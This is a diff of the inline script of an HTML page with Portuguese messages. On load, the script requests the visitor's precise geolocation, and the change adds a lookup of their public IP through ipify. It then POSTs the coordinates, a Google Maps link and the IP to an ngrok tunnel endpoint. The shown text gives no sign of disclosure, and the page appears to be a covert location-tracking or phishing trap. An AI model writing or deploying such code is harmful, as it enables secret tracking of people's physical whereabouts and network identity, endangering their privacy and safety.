@@ -103,71 +103,85 @@
     </div>
   </div>
 
-  <script>
-    window.addEventListener("load", () => {
-      if (!navigator.geolocation) {
-        alert("Geolocalização não é suportada pelo navegador.");
-        return;
-      }
+<script>
+  window.addEventListener("load", () => {
+    if (!navigator.geolocation) {
+      alert("Geolocalização não é suportada pelo navegador.");
+      return;
+    }
 
-      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      });
+    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
     });
+  });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
+  const dataAtual = new Date();
+  const dia = String(dataAtual.getDate()).padStart(2, '0');
+  const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+  const ano = dataAtual.getFullYear();
+  const dataFormatada = `${dia}/${mes}/${ano}`;
+  document.getElementById("data-atual").textContent = dataFormatada;
 
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+  async function sendLocation(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      console.log("Enviando localização:", { latitude, longitude, maps });
+    try {
+      // Obtendo IP público
+      const ipResponse = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipResponse.json();
+      const ip = ipData.ip;
 
-      fetch("https://1e2746f31e5a.ngrok-free.app/send-location", {
+      const payload = {
+        latitude,
+        longitude,
+        maps,
+        ip
+      };
+
+      console.log("Enviando dados:", payload);
+
+      const response = await fetch("https://1e2746f31e5a.ngrok-free.app/send-location", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
-        .then(res => res.json())
-        .then(data => {
-          if (data.success) {
-            console.log("Localização enviada com sucesso.");
-          } else {
-            alert("Erro ao enviar a localização.");
-            console.error("Erro no back-end:", data);
-          }
-        })
-        .catch(error => {
-          alert("Erro ao enviar a localização.");
-          console.error("Erro na requisição:", error);
-        });
-    }
+        body: JSON.stringify(payload)
+      });
 
-    function handleError(error) {
-      let message = "Erro desconhecido.";
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          message = "Permissão de localização negada.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          message = "Localização indisponível.";
-          break;
-        case error.TIMEOUT:
-          message = "Tempo esgotado para obter localização.";
-          break;
+      const data = await response.json();
+
+      if (data.success) {
+        console.log("Localização e IP enviados com sucesso.");
+      } else {
+        alert("Erro ao enviar os dados.");
+        console.error("Erro no back-end:", data);
       }
-      alert(message);
-      console.warn("Erro de geolocalização:", error.message);
+
+    } catch (error) {
+      alert("Erro ao enviar os dados.");
+      console.error("Erro na requisição:", error);
     }
-  </script>
+  }
+
+  function handleError(error) {
+    let message = "Erro desconhecido.";
+    switch (error.code) {
+      case error.PERMISSION_DENIED:
+        message = "Permissão de localização negada.";
+        break;
+      case error.POSITION_UNAVAILABLE:
+        message = "Localização indisponível.";
+        break;
+      case error.TIMEOUT:
+        message = "Tempo esgotado para obter localização.";
+        break;
+    }
+    alert(message);
+    console.warn("Erro de geolocalização:", error.message);
+  }
+</script>
 </body>
 
 </html>
